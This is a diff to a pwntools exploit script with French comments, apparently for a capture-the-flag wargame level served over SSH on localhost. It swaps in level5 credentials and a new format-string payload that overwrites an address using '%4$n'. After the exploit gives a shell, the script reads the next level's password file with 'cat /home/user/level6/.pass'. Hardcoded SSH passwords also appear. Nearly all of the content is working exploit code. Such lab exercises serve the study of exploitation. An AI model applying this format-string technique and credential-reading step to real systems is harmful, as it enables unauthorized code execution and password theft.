@@ -13,8 +13,8 @@ context.log_level = 'info'  # Niveau de log (debug, info, warning, error)
 LOCAL = False  # Mettre à False pour l'exploitation SSH
 HOST = "localhost"  # Hôte pour SSH
 PORT = 8881  # Port pour SSH
-USER = "level4"  # Nom d'utilisateur SSH
-PASSWORD = "b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa"  # Mot de passe SSH
+USER = "level5"  # Nom d'utilisateur SSH
+PASSWORD = "0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a"  # Mot de passe SSH
 SSH_SESSION = None
 
 
@@ -31,7 +31,7 @@ def get_connection(custom_env=None):
         SSH_SESSION = None
         local_env = os.environ.copy()
         final_env = merge_env(local_env, custom_env)
-        return process(['./Resources/level4'], env=final_env)
+        return process(['./Resources/' + USER], env=final_env)
     else:
         shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
         SSH_SESSION = shell
@@ -42,20 +42,30 @@ def get_connection(custom_env=None):
 
         # Fusionner avec nos variables personnalisées
         final_env = merge_env(remote_env_dict, custom_env)
-        return shell.process(['/home/user/level4/level4'], env=final_env)
+        return shell.process(['/home/user/' + USER + '/' + USER], env=final_env)
 
 def exploit():
-    payload = p32(0x8049810) + b"%16930112d" + b"%12$n"
+    
+    target_addr_decimal = int("0x080484a4", 16) - 4
+    payload = p32(0x8049838) + b"%" + str(target_addr_decimal).encode() + b"d"  + b"%4$n"
+
+
 
     conn = get_connection()
 
     if LOCAL:
         gdb.attach(conn, '''
-          break *n+59
+          break *main
           continue
           ''')
     # Envoi du payload
     conn.sendline(payload)
+
+    conn.recvuntil(b'$')
+    conn.sendline(b'cat /home/user/level6/.pass')
+    flag = conn.recvline()
+    print("\n=== Flag ===")
+    print(flag.decode().strip())
 
     try:
         # Tentative d'obtenir un shell interactif
